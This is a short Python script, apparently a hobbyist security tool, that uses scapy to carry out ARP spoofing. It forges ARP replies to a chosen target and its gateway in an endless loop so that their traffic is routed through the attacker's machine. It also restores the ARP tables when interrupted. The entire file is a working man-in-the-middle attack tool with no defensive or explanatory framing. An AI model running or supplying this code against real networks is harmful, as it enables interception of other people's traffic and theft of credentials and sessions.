import scapy.all as scapy
import argparse
import time

#scapy.ls(scapy.ARP())
#08:00:27:e5:7a:80 says 10.0.2.15
class MITM():

    def parseinfo(self):
        parse_o = argparse.ArgumentParser()
        parse_o.add_argument("-t","--target",dest="target_ip",help="Enter Target Ip")
        parse_o.add_argument("-g","--gateway",dest="gateway_ip",help="Enter Gateway Ip")

        self.data = parse_o.parse_args()

    def get_mac_address(self,ip):
        arp_request_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        combined_packet = broadcast_packet/arp_request_packet
        answerd_list= scapy.srp(combined_packet, timeout=1,verbose=False)[0]
        return answerd_list[0][1].hwsrc

    def attack(self,target_ip,gateway_ip):
        target_mac = self.get_mac_address(target_ip)
        arp_response_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=gateway_ip)
        scapy.send(arp_response_packet,verbose=False)

    def return_back(self,target_ip,gateway_ip):
        target_mac = self.get_mac_address(target_ip)
        real_mac = self.get_mac_address(gateway_ip)
        arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip,hwsrc=real_mac)
        scapy.send(arp_response_packet, verbose=False,count = 6)



if __name__ == "__main__":
    mitm = MITM()
    mitm.parseinfo()
    value=0
    try:
        while True:
            mitm.attack(mitm.data.target_ip,mitm.data.gateway_ip)
            mitm.attack(mitm.data.gateway_ip,mitm.data.target_ip)
            value +=1
            print(f"\r {value} packets were sent to the IP address {mitm.data.target_ip} ",end="")
            time.sleep(3)

    except KeyboardInterrupt:
        mitm.return_back(mitm.data.target_ip,mitm.data.gateway_ip)
        mitm.return_back(mitm.data.gateway_ip,mitm.data.target_ip)

        print("\nThe operation has been halted.")